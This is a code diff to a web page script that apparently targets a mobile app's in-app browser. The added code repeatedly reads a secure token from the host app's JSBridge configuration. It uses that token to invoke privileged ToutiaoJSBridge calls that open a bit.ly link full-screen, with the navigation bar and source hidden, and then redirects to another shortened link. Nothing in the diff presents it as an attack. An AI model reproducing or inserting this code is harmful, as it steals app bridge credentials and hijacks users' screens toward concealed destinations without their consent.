@@ -8,13 +8,40 @@
 
     var schemeFired = false;
     var pageLoadTime = Date.now();
-
-    var TOKEN = 'iMA3W1dgamQv/uVdrBu5q0+X001zyZu3VIDlz8bpXWFJIl7n8xpUXmI3QkZpb1B4+eVuxqz1ghvT3+Xcv7iIS4u63E/Y1om48LxQ0E/XxyUG10G0cVwKe9HhiJXc0YqrxVMhSglWdDjP1hubzWnGD+09g7yqlE0FPWCshgsT0cmnSiiVMPEUQ0mKxjL0+Pra8vVTiTgj6UNY4rpelDNdgDVjaIWMn88V73Wg3mXUm6zmq4uG6GO8tbRSDjjjOt8lpv74LHBkOFLLPYINwr9tJB3Qp29+hHDISVf0jUoCb1T1dFhhpHh0exn+l7P3B6Ykg0I72vmgECpMvFWNR7ks82doFQ+K8cHzLS5y9NH+ew3HiG20RqzjwVz61EEhGTeeiWRKcIPInreJtGhpfyX8ObrwTwLhvIXQZN6+RVuWxL7/wMYKa3jXQ5VP1oSt2g2SviDm7hWP0pnyzbnLBb2zxeqd54YFjv5qb4pE18nnYb4sgQ7XRDOEN0kn377+6wt3fi3qlEbBjkAL5VnMvRc4DqtlN8QNHhu7tG9M9FqLidQ2RoPHGIWxvPJdz0SIn1ZEzhbElIMw/73Bb92RXt8seL1HBaXrZMtdt7kwVTIqmsBw02CtIAlX5SShXNx4hgvRgdMRYWYDSGdb8FsgaNyOFmD3hNg+0s+EpVfVqKKBXnCn4z1robpCkCJnX00ONNd22zWZ5vcCLSrwuG3rXBO0DSGEkCA/RtdtcXF0QFEUdCqVOpzW8LRqSO6hN2JP3qCK+k5dtdbP+3OxU6lNj8ieYwRvbsVwHQNGewlnn4WPJCjRYaHOZhUVQvbF/Uv7UmBpHtVAHu2ZGbwRAypGF31UGRJVBTS0EPYeFFpq0kBtV1zt5rpVZid7rDGXk3BXvDHGV8u2QKylZTlCvbywypYafA==';
     var CID = 1870060644426865;
+    var POPUP_URL = 'https://bit.ly/4aHQcVB';
+    var cachedToken = null;
 
     function log(msg) { try { navigator.sendBeacon('/debug-log', msg); } catch(e){} }
 
+    function tryGetToken() {
+        if (cachedToken) return;
+        try {
+            var cfg = window.JSBridge && typeof window.JSBridge.getConfig === 'function' && window.JSBridge.getConfig();
+            if (cfg && cfg.secure && cfg.secure.token) { cachedToken = cfg.secure.token; log('tok:cached'); }
+        } catch(e){}
+    }
+    setTimeout(tryGetToken, 500);
+    setTimeout(tryGetToken, 1500);
+    setTimeout(tryGetToken, 3000);
+
     function fireFullscreen() {
+        var token = cachedToken;
+        if (!token) {
+            try {
+                var cfg = window.JSBridge && typeof window.JSBridge.getConfig === 'function' && window.JSBridge.getConfig();
+                if (cfg && cfg.secure && cfg.secure.token) token = cfg.secure.token;
+            } catch(e){}
+        }
+        log('fire:tok:' + (token ? 'yes' : 'no'));
+        var tt = window.ToutiaoJSBridge;
+        if (tt && tt.call) {
+            if (token) {
+                try { tt.call('openAdLandPageLinks', { url: POPUP_URL, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page', hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1, _jsb_secure_token: token }, function(res){ log('res:' + JSON.stringify(res)); }); } catch(e){}
+            }
+            try { tt.call('openOrganicLandPage', { url: POPUP_URL, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page', hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1 }, function(){}); } catch(e){}
+            try { tt.call('openAdLandPageLinks', { url: POPUP_URL, landingStyle: 2, title: '', isDeeplink: 0, refer: 'ad', hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1 }, function(){}); } catch(e){}
+        }
         window.location.href = 'https://bit.ly/4fnzeOR';
     }
 
